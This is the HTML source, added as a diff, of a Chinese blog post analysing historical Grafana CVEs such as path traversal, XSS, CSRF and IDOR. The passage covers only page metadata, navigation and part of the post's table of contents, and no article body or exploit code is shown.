@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="最近学了下Go，也准备挖一下Go WEB应用的漏洞。梳理了Grafana的结构，调试分析了Grafana的一些历史漏洞及修复方案，也在分析过程中挖到了新的。感觉Go语言确实是比较安全的，很多漏洞其实都是代码逻辑上的问题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Grafana 历史漏洞分析">
+<meta property="og:url" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="最近学了下Go，也准备挖一下Go WEB应用的漏洞。梳理了Grafana的结构，调试分析了Grafana的一些历史漏洞及修复方案，也在分析过程中挖到了新的。感觉Go语言确实是比较安全的，很多漏洞其实都是代码逻辑上的问题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808205929971.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808210006793.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808225317771.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808230801960.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809000602775.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809001253404.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809095608186.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100109265.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100041876.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809100415312.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809114013245.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809115705806.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809123351013.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809140928365.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809141406618.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809141511148.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809145815252.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809145906774.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230809150602387.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810004320427.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810004815084.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810010326392.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810010448109.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810011415214.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810013336028.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810013541777.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810014730199.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810011703730.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810031537183.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810032245092.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810035135187.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810185059372.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810190826535.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810190839995.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230810191929462.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230813104842663.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230813105116764.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814143154837.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814143540414.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814145312250.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814150134984.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814150301338.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814151114476.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814151412462.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230818104252049.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230819165912200.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820095531878.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820100810077.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101238644.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101324704.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101706481.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820102114401.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820102817109.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103226886.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103720312.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103824138.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820105810832.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820110418904.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820111125520.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820111715061.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820112437889.png">
+<meta property="article:published_time" content="2023-08-06T08:31:15.000Z">
+<meta property="article:modified_time" content="2024-10-26T08:12:02.028Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Grafana">
+<meta property="article:tag" content="Go">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808205929971.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"2023/08/06/Grafana-历史漏洞分析/","title":"Grafana 历史漏洞分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Grafana 历史漏洞分析 | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-39226%EF%BC%88%E5%BF%AB%E7%85%A7%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">CVE-2021-39226（快照验证绕过）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">2.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.2.2.</span> <span class="nav-text">复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-43798%EF%BC%88%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">CVE-2021-43798（路径穿越任意文件读取）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="nav-number">3.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">3.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-43813%EF%BC%88%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-md%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">CVE-2021-43813（路径穿越.md文件读取）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="nav-number">4.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#8-1-0"><span class="nav-number">4.3.1.</span> <span class="nav-text">8.1.0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-3-1"><span class="nav-number">4.3.2.</span> <span class="nav-text">8.3.1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">4.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-43815%EF%BC%88%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8Acsv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">CVE-2021-43815（路径穿越csv文件读取）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-3"><span class="nav-number">5.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="nav-number">5.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">5.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-21702%EF%BC%88Proxy-XSS%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">CVE-2022-21702（Proxy XSS）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-4"><span class="nav-number">6.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%90Proxy"><span class="nav-number">6.2.1.</span> <span class="nav-text">数据源Proxy</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">6.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-21703%EF%BC%88%E5%90%8C%E7%AB%99CSRF%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">CVE-2022-21703（同站CSRF）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-5"><span class="nav-number">7.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="nav-number">7.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="nav-number">7.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-21713%EF%BC%88Teams-API-IDOR%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">CVE-2022-21713（Teams API IDOR）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-6"><span class="nav-number">8.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="nav-number">8.3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#api-teams-search"><span class="nav-number">8.3.1.</span> <span class="nav-text">&#x2F;api&#x2F;teams&#x2F;search</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#api-teams-teamId"><span class="nav-number">8.3.2.</span> <span class="nav-text">&#x2F;api&#x2F;teams&#x2F;:teamId</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#api-teams-teamId-members"><span class="nav-number">8.3.3.</span> <span class="nav-text">&#x2F;api&#x2F;teams&#x2F;:teamId&#x2F;members</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="nav-number">8.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-29170%EF%BC%88Network-restrictions-bypass%EF%BC%89"><span class="nav-number">9.</span> <span class="nav-text">CVE-2022-29170（Network restrictions bypass）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-7"><span class="nav-number">9.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="nav-number">9.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-7"><span class="nav-number">9.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-31097%EF%BC%88XSS-%E2%80%94-a%E6%A0%87%E7%AD%BEhref%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">CVE-2022-31097（XSS — a标签href）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-8"><span class="nav-number">10.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8"><span class="nav-number">10.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-8"><span class="nav-number">10.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-31107%EF%BC%88OAuth-%E8%B4%A6%E5%8F%B7%E6%8E%A5%E7%AE%A1%EF%BC%89"><span class="nav-number">11.</span> <span 